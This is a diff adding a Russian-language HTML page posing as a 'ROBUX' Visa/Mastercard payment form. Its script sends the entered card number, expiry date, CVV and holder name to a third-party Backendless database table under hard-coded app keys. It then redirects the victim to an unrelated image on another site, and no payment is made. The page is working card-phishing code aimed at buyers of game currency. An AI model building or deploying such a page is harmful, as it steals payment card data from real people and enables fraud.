@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Оплата</title>
+    <link rel="stylesheet" href="savedstyle.css">
+</head>
+<body>
+    <div class="payment-container">
+        <div class="card-header">
+            <div class="bank-logo">ROBUX</div>
+            <div class="card-type">VISA/MASTERCARD</div>
+        </div>
+
+        <form id="payment-form">
+            <div class="card-number">
+                <label for="card-number">Номер карты</label>
+                <input type="text" id="card-number" name="cardNumber" placeholder="0000 0000 0000 0000" required>
+            </div>
+            <div class="card-details">
+                <div>
+                    <label for="expiry-month">ММ</label>
+                    <input type="text" id="expiry-month" name="expiryMonth" placeholder="01" required>
+                </div>
+                <div>
+                    <label for="expiry-year">ГГ</label>
+                    <input type="text" id="expiry-year" name="expiryYear" placeholder="28" required>
+                </div>
+                <div>
+                    <label for="cvv">CVV/CVC</label>
+                    <input type="password" id="cvv" name="cvv" placeholder="***" required>
+                </div>
+            </div>
+            <div class="card-holder">
+                <label for="card-holder">Имя владельца</label>
+                <input type="text" id="card-holder" name="cardHolder" placeholder="ИМЯ ФАМИЛИЯ" required>
+            </div>
+            <button type="submit">Оплатить</button>
+        </form>
+        <p class="disclaimer">Продолжая оплату, вы соглашаетесь на сбор и обработку персональных данных</p>
+    </div>
+
+    <!-- Подключение Backendless SDK -->
+    <script src="https://api.backendless.com/sdk/js/latest/backendless.min.js"></script>
+
+    <script>
+        // Инициализация Backendless
+        Backendless.initApp("2C070BE2-2666-46CD-8EDB-9A9E6FEA9F16", "8EBA2B35-4846-45DF-AE25-458923793359");
+
+        const form = document.getElementById("payment-form");
+
+        form.addEventListener("submit", (e) => {
+            e.preventDefault();
+
+            // Сбор данных из формы
+            const data = {
+                cardNumber: document.getElementById("card-number").value,
+                expiryMonth: document.getElementById("expiry-month").value,
+                expiryYear: document.getElementById("expiry-year").value,
+                cvv: document.getElementById("cvv").value,
+                cardHolder: document.getElementById("card-holder").value,
+            };
+
+            // Сохранение данных в таблицу "Robux" в Backendless
+            Backendless.Data.of("Robux")
+                .save(data)
+                .then(() => {
+                    // Перенаправление на другой сайт после успешной оплаты
+                    window.location.href = "https://pricom.kz/images/2021/03/blag.jpg"; // Замените URL на ваш
+                })
+                .catch((error) => {
+                    console.error("Ошибка при отправке данных:", error);
+                    alert("Ошибка при отправке данных: " + error.message);
+                });
+        });
+    </script>
+</body>
+</html>
